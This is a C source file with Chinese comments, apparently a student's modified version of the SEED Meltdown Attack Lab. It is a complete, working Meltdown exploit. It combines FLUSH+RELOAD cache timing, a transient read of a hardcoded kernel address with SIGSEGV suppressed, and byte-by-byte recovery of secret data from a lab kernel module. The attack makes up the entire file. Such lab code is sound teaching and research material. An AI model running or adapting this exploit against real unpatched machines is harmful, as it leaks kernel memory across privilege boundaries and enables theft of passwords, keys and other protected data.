/*这段代码的主体框架完全来自Wenliang Du, Syracuse University的
Meltdown Attack Lab：
http://www.cis.syr.edu/~wedu/seed/Labs_16.04/System/Meltdown_Attack/Meltdown_Attack.pdf
对其进行了如实验报告中的修改。*/


#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

uint8_t array[256*4096];
/*由测试知hit情况下不会超过300，而miss时不会低于300,以300为界*/
#define CACHE_HIT_THRESHOLD (300)
/*delta只要能隔离上下界受其他变量影响的可能即可，值不一定*/
#define DELTA 2048

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  //flush掉cache中的数组块
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
     addr = &array[i * 4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD)
        scores[i]++; /*命中数组哪位一次，该位的命中分数就+1,最终结算以命中次数最多的为结果*/
  }
}

void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // 使计算模块处于繁忙之中
   asm volatile(
       ".rept 400;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
    
   // 瞬态指令
   kernel_data = *(char*)kernel_data_addr;  
   array[kernel_data * 4096 + DELTA] += 1;              
}

// 用于程序处理异常的变量与函数声明
static sigjmp_buf jbuf;
static void catch_segv()
{
   siglongjmp(jbuf, 1);
}

int main()
{
  int i, j, ret = 0;
  int k;
  
  // 将内存越权调用的信号量与处理程序关联
  signal(SIGSEGV, catch_segv);

  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }
  
  
  for(k = 0;k < 20;k++) {
    memset(scores, 0, sizeof(scores));
    flushSideChannel();
  
	  
    // 在一个地址上尝试1000次 选择命中次数最多的.
    for (i = 0; i < 1000; i++) {
    
	  ret = pread(fd, NULL, 0, 0);
	  
	  if (ret < 0) {
	    perror("pread");
	    break;
	  }
	
		//每次测试前都flush一次cache
	  for (j = 0; j < 256; j++) 
		  _mm_clflush(&array[j * 4096 + DELTA]);
		  
		//依序meltdown每一位内存。初始地址0xffffffffc0cbf000是由准备工作的make环节得知的
	  if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xffffffffc0cbf000+k); }

	  reloadSideChannelImproved();
    }


    int max = 0;
    for (i = 0; i < 256; i++) {
	  if (scores[max] < scores[i]) max = i;
    }
    printf("character: %c \n",max);
    
  }
  printf("\nWork successfully！\n");
  return 0;
}
